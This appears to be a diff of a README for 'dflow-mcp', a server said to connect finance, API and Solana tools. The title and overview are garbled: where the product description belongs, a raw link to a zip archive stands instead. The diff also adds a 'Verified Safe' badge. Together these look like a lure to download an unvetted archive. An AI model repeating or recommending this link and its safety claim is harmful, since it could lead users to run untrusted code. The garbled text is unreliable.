@@ -1,5 +1,7 @@
 # 🌟 dflow-mcp - Simple Server for https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/.netlify/functions/mcp-v2-bootstrap/mcp-dflow-v1.9.zip
 
+[![SafeSkill 92/100](https://img.shields.io/badge/SafeSkill-92%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/ba1nch0d-dflow-mcp)
+
 ## 🎉 Overview
 dflow-mcp is a user-friendly server designed for https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/.netlify/functions/mcp-v2-bootstrap/mcp-dflow-v1.9.zip It connects to various tools and applications, ensuring smooth interactions and data exchanges. Whether you are working on finance, APIs, or tools related to Solana, this application simplifies your workflow.
 
